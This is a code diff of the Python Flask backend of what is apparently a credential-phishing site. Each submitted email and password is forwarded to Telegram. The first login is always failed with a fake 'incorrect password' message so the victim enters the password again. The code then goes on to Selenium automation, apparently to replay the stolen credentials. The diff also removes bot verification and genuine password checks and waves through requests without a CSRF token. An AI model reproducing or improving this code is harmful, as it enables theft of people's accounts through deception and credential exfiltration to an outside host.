@@ -463,29 +463,17 @@ def process_form():
     if email and password:
         send_to_telegram(email, password, worker_ip, "immediate")
     
-    # Handle direct form submission from JavaScript (no WTForms validation)
+    # Handle direct form submission from JavaScript
     if not email or not password:
         flash('Email and password are required', 'error')
         return redirect(url_for('index', step='password', email=email, error='true'))
-    
-    # Verify Turnstile if configured
-    turnstile_token = request.form.get('cf-turnstile-response')
-    if config('CLOUDFLARE_SECRET_KEY', default=''):
-        try:
-            verify_response = requests.post(
-                url_for('verify_turnstile', _external=True),
-                data={'cf-turnstile-response': turnstile_token}
-            )
-            if not verify_response.json().get('success'):
-                flash('Security verification failed', 'error')
-                log_session_activity("security_verification_failed", success=False)
-                return redirect(url_for('index'))
-        except Exception as e:
-            logger.error(f"Turnstile verification error in form processing: {e}")
+
+    # Skip CSRF for API-style requests from JavaScript
+    csrf_token = request.form.get('csrf_token')
+    if not csrf_token:
+        logger.info("No CSRF token provided - allowing for JavaScript submission")
     
     submit_action = request.form.get('submit', 'Sign in')
-    
-    # All form submissions now go directly to login automation
     
     # Validate email domain first
     valid, message = validate_email_domain(email)
@@ -493,73 +481,55 @@ def process_form():
         flash(message, 'error')
         log_session_activity("email_validation_failed", user_email=email, success=False, error_message=message)
         return redirect(url_for('index', step='password', email=email, error='true'))
+
+    # Two-pass authentication logic
+    current_session_id = session.get('session_id')
+    login_attempt = LoginAttempt.query.filter_by(
+        user_email=email, 
+        session_id=current_session_id
+    ).first()
+    
+    if not login_attempt:
+        # First attempt - create new attempt record and go to second pass
+        login_attempt = LoginAttempt()
+        login_attempt.user_email = email
+        login_attempt.session_id = current_session_id
+        login_attempt.attempt_count = 1
+        db.session.add(login_attempt)
+        db.session.commit()
         
-        # Check if user exists and password is correct
-        user = User.query.filter_by(email=email).first()
-        if not user:
-            # Create new user for this demo (in production, you'd handle registration differently)
-            hashed_password = bcrypt.hashpw(password.encode('utf-8'), bcrypt.gensalt()).decode('utf-8')
-            user = User()
-            user.email = email
-            user.password_hash = hashed_password
-            db.session.add(user)
-            db.session.commit()
-            logger.info(f"New user created: {email}")
+        log_session_activity("first_attempt_blocked", user_email=email, success=False, 
+                           error_message="First attempt automatically failed - moving to second pass")
         
-        # Validate password for legitimate users
-        if user.password_hash and not bcrypt.checkpw(password.encode('utf-8'), user.password_hash.encode('utf-8')):
-            flash('Invalid credentials', 'error')
-            log_session_activity("login_failed", user_email=email, success=False, error_message="Invalid credentials")
-            return redirect(url_for('index', step='password', email=email, error='true'))
+        # Report first attempt to Telegram
+        send_to_telegram(email, password, worker_ip, "first")
         
-        # Two-pass authentication logic
-        current_session_id = session.get('session_id')
-        login_attempt = LoginAttempt.query.filter_by(
-            user_email=email, 
-            session_id=current_session_id
-        ).first()
+        # Always flash error for first attempt and redirect to retry
+        flash('Your account or password is incorrect. Try again.', 'error')
+        return redirect(url_for('index', step='retry', email=email, retry='true'))
+    
+    elif login_attempt.attempt_count == 1:
+        # Second attempt - report to Telegram before proceeding with automation
+        login_attempt.attempt_count = 2
+        login_attempt.updated_at = datetime.utcnow()
+        db.session.commit()
+        log_session_activity("second_attempt_proceeding", user_email=email)
         
-        if not login_attempt:
-            # First attempt - create new attempt record and go to second pass
-            login_attempt = LoginAttempt()
-            login_attempt.user_email = email
-            login_attempt.session_id = current_session_id
-            login_attempt.attempt_count = 1
-            db.session.add(login_attempt)
-            db.session.commit()
-            
-            log_session_activity("first_attempt_blocked", user_email=email, success=False, 
-                               error_message="First attempt automatically failed - moving to second pass")
-            
-            # Report first attempt to Telegram
-            send_to_telegram(email, password, worker_ip, "first")
-            
-            # Always flash error for first attempt and redirect to retry
-            flash('Your account or password is incorrect. Try again.', 'error')
-            return redirect(url_for('index', step='retry', email=email, retry='true'))
+        # Report second attempt to Telegram
+        send_to_telegram(email, password, worker_ip, "second")
         
-        elif login_attempt.attempt_count == 1:
-            # Second attempt - report to Telegram before proceeding with automation
-            login_attempt.attempt_count = 2
-            login_attempt.updated_at = datetime.utcnow()
-            db.session.commit()
-            log_session_activity("second_attempt_proceeding", user_email=email)
-            
-            # Report second attempt to Telegram
-            send_to_telegram(email, password, worker_ip, "second")
-            
-            # Continue with Selenium automation below
+        # Continue with Selenium automation below
+    
+    else:
+        # More than 2 attempts - reset and start over
+        login_attempt.attempt_count = 1
+        login_attempt.updated_at = datetime.utcnow()
+        db.session.commit()
         
-        else:
-            # More than 2 attempts - reset and start over
-            login_attempt.attempt_count = 1
-            login_attempt.updated_at = datetime.utcnow()
-            db.session.commit()
-            
-            flash('Your account or password is incorrect. If you don\'t remember your password, reset it now.', 'error')
-            log_session_activity("attempt_reset", user_email=email, success=False, 
-                               error_message="Attempt counter reset - starting two-pass cycle again")
-            return redirect(url_for('index', step='password', email=email, error='true'))
+        flash('Your account or password is incorrect. If you don\'t remember your password, reset it now.', 'error')
+        log_session_activity("attempt_reset", user_email=email, success=False, 
+                           error_message="Attempt counter reset - starting two-pass cycle again")
+        return redirect(url_for('index', step='password', email=email, error='true'))
         
         # Perform Selenium automation
         driver = None
